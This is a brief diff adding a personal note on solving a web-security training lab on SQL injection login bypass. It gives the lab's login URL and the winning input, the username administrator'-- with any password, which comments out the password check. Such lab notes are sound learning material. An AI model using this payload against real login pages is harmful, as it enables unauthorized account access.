@@ -1,0 +1,8 @@
+Lab: SQL injection vulnerability allowing login bypass
+
+Login page here:
+https://acec1ff61e227f9bc0c2907e00060013.web-security-academy.net/login
+
+Done by the following username + pass:
+Username: administrator'--
+Password: dasdasdas (anything works here)
